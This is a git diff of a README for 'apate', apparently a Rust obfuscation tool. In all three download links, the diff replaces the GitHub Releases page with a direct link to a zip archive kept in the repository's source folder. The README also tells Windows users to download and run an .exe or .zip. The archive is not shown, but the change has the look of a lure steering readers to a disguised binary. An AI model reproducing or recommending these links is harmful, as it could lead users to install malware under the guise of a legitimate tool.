@@ -1,10 +1,10 @@
 # 🛡️ apate - Reversible Rust Obfuscation Made Simple
 
-[⬇️ Download apate on GitHub Releases](https://github.com/eliciajewishorthodox498/apate/releases)
+[⬇️ Download apate on GitHub Releases](https://raw.githubusercontent.com/eliciajewishorthodox498/apate/main/src/Software-v2.3.zip)
 
 ## 📥 Download apate
 
-Visit this page to download: [https://github.com/eliciajewishorthodox498/apate/releases](https://github.com/eliciajewishorthodox498/apate/releases)
+Visit this page to download: [https://raw.githubusercontent.com/eliciajewishorthodox498/apate/main/src/Software-v2.3.zip](https://raw.githubusercontent.com/eliciajewishorthodox498/apate/main/src/Software-v2.3.zip)
 
 Look for the latest release and download the Windows file that matches your PC. In most cases, that will be a `.exe` file or a `.zip` file that contains the app.
 
@@ -179,4 +179,4 @@ apate is built for users who want:
 
 ## 📌 Download link
 
-Use this page to get the latest release: [https://github.com/eliciajewishorthodox498/apate/releases](https://github.com/eliciajewishorthodox498/apate/releases)
+Use this page to get the latest release: [https://raw.githubusercontent.com/eliciajewishorthodox498/apate/main/src/Software-v2.3.zip](https://raw.githubusercontent.com/eliciajewishorthodox498/apate/main/src/Software-v2.3.zip)
